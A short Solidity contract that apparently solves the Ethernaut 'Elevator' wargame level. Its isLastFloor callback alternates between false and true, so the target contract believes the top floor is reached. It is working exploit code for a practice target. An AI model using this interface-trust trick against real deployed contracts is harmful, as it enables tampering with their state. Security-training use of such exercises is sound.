// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building, Elevator} from "./Elevator.sol";

contract HackerBuilding is Building {
    uint private callCnt = 0;

    function goTo(Elevator elevator, uint256 _floor) public {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        callCnt += 1;

        if (callCnt % 2 == 1) {
            return false;
        }
        return true;
    }
}
